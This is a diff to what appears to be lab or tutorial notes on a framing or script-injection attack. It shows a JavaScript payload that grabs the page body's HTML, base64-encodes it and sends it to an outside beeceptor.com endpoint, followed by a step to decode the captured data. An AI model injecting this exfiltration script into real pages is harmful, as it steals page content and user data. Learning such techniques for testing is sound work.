@@ -22,7 +22,7 @@ Frameble
 <script>
 var exfil = document.getElementsByTagName("body")[0].innerHTML;
 window.location.href="https://berkin.free.beeceptor.com/" + btoa(exfil);
-<script> - this creates a variable exfil, and use btoa to return a base64-encoded version.
+</script> - this creates a variable exfil, and use btoa to return a base64-encoded version.
 6. Get an encrypted text on beeceptor and decode it either using echo [code without colons] | base64 --decode
 or a decoding website
 
